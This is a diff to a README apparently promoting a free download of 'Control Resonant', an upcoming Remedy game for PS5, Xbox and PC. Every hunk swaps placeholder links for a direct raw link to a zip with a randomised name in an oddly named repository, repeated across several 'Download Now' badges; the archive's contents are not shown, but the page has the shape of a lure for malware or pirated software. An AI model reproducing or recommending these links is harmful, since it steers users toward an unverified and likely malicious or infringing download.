@@ -4,7 +4,7 @@
 
 > Remedy Entertainment's sequel to the acclaimed Control — explore a paranormal Manhattan transformed by supernatural forces as Dylan Faden navigates a city gone utterly strange.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://download.com)&nbsp;
+[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/frozen-immunoassay51/control-resonant/raw/refs/heads/main/mispoise/control-resonant-leucocytolytic.zip)&nbsp;
 ![Platform](https://img.shields.io/badge/Platform-Available-green?style=flat-square)&nbsp;
 ![Release](https://img.shields.io/badge/Release-2026-orange?style=flat-square)
 
@@ -37,9 +37,9 @@ Releases on **2026** · Available on **PS5, Xbox Series X|S, PC**.
 
 ### Ready to play / use?
 
-[![Download Control Resonant](https://img.shields.io/badge/Download-Control%20Resonant-brightgreen?style=for-the-badge)](https://download.com)
+[![Download Control Resonant](https://img.shields.io/badge/Download-Control%20Resonant-brightgreen?style=for-the-badge)](https://github.com/frozen-immunoassay51/control-resonant/raw/refs/heads/main/mispoise/control-resonant-leucocytolytic.zip)
 
-> **[Click here to download](https://download.com)**
+> **[Click here to download](https://github.com/frozen-immunoassay51/control-resonant/raw/refs/heads/main/mispoise/control-resonant-leucocytolytic.zip)**
 
 </div>
 
@@ -69,7 +69,7 @@ Control Resonant is one of the **most hyped releases of Summer 2026** — trendi
 
 | Download | Community | News |
 |:--------:|:---------:|:----:|
-| [Download here](https://download.com) | Reddit & Discord | Gaming & tech news |
+| [Download here](https://github.com/frozen-immunoassay51/control-resonant/raw/refs/heads/main/mispoise/control-resonant-leucocytolytic.zip) | Reddit & Discord | Gaming & tech news |
 
 ---
 
@@ -77,7 +77,7 @@ Control Resonant is one of the **most hyped releases of Summer 2026** — trendi
 
 **Don't miss out — Control Resonant is one of 2026's must-have releases.**
 
-[![Download Now](https://img.shields.io/badge/Download-Control%20Resonant-blue?style=for-the-badge)](https://download.com)
+[![Download Now](https://img.shields.io/badge/Download-Control%20Resonant-blue?style=for-the-badge)](https://github.com/frozen-immunoassay51/control-resonant/raw/refs/heads/main/mispoise/control-resonant-leucocytolytic.zip)
 
 *Control Resonant — 2026 · PS5, Xbox Series X|S, PC*
 
